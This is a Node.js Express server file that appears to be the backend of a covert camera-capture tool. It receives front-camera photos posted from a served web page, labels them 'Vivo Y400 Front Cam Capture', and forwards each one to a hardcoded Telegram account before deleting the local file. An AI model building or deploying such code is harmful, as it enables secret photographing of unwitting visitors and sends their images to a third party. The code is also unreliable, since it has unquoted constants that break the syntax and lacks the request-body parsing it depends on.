// server.js

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');

// ---------- 1️⃣ Replace with your actual details ----------
const BOT_TOKEN = 92b4e08fc8386dc5b6d754f817b50c3f
const MY_USERNAME = FollowVenusAndSaturn
// ----------------------------------------------------------

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();

// Serve static assets (public folder)
app.use(express.static('public'));

// --------------------- 2️⃣ Serve the front‑page ---------------------
app.get('/', (req, res) => {
  // __dirname points to the directory containing this file
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// --------------------- 3️⃣ Handle image capture ---------------------
app.post('/capture', async (req, res) => {
  try {
    const base64Image = req.body.imageData;
    // Remove the data URI prefix (e.g., "data:image/jpeg;base64,")
    const cleanBase64 = base64Image.replace(/^data:image\/jpeg;base64,/, '');

    const imageBuffer = Buffer.from(cleanBase64, 'base64');
    const filename = `vivo_y400_${Date.now()}.jpg`;
    const filePath = path.join(__dirname, filename);

    // Write the image to disk temporarily
    fs.writeFileSync(filePath, imageBuffer);

    // Send photo to Telegram
    await bot.sendPhoto(
      MY_USERNAME,
      {
        source: fs.createReadStream(filePath),
        caption: `📸 **Vivo Y400 Front Cam Capture**\nTime: ${new Date().toLocaleString()}`
      }
    );

    // Clean up: delete the local file
    fs.unlinkSync(filePath);

    res.json({ success: true, message: 'Photo sent to Telegram' });
  } catch (error) {
    console.error('Error sending photo:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// --------------------- 4️⃣ Start the server ---------------------
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
